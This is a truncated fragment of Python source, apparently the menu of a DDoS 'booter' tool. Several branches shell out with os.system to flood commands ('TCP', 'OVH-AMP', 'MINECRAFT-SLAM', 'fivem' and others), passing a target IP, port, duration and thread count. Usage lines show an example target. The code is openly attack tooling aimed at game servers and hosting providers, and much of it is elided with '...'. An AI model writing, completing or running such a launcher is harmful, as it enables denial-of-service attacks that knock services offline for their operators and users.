...
""")
                os.system(f"TCP {method} {ip} {port} {time} {threads}")
            except IndexError:
...
""")
                os.system(f"STD-NOSPOOF {ip} {port} {time} {threads}")
            except IndexError:
...
""")
                ...
                print("Usage : std-v2 <ip> <port> <time> <threads>")
...
""")
                os.system(f"MINECRAFT-SLAM {ip} {port} {time} {threads}")
            except IndexError:
...
""")
                os.system(f"OVH-AMP {ip} {port} {time} {threads}")
            except IndexError:
...
""")
                os.system(f"nfo {ip} {port} {threads} {time}")
            except IndexError:
...
""")
                os.system(f"fivem {ip} {port} {time} {threads}")
                os.system('cls' if os.name == 'nt' else 'clear')
            except IndexError:
                print("Usage : fivem <ip> <port> <time> <threads>")
                print("Example : fivem 1.1.1.1 80 99999 60")
            #######L7######
